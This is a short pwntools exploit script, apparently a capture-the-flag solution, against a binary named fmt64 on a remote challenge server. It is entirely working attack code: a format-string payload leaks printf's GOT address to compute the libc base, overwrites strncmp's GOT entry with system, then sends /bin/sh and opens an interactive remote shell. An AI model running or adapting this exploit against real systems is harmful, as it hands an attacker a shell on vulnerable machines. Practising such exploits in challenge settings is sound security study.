from pwn import *

context.terminal = ('open-wsl.exe', "-e")
# context.log_level = 'debug'
context.arch = 'amd64'

# io = process("./fmt64")
io = remote("everything411.top", 10002)
elf = ELF("./fmt64")
libc = ELF("./x64-libc-2.23.so")

printf_got = elf.got["printf"]
printf_offset = libc.symbols["printf"]
system_offset = libc.symbols["system"]
strncmp_got = elf.got["strncmp"]

def sendfmt(fmt):
    log.info("payload = %s" % repr(fmt))
    io.sendline(fmt)
    return io.recv()
io.recv()
leak = sendfmt(b"%7$saaaa" + p64(printf_got))
printf_addr = u64(leak[0:6] + b'\x00\x00')
libcbase = printf_addr - printf_offset
system_addr = libcbase + system_offset

fmt = fmtstr_payload(6, {strncmp_got: system_addr})
sendfmt(fmt)
io.sendline("/bin/sh")
io.interactive()
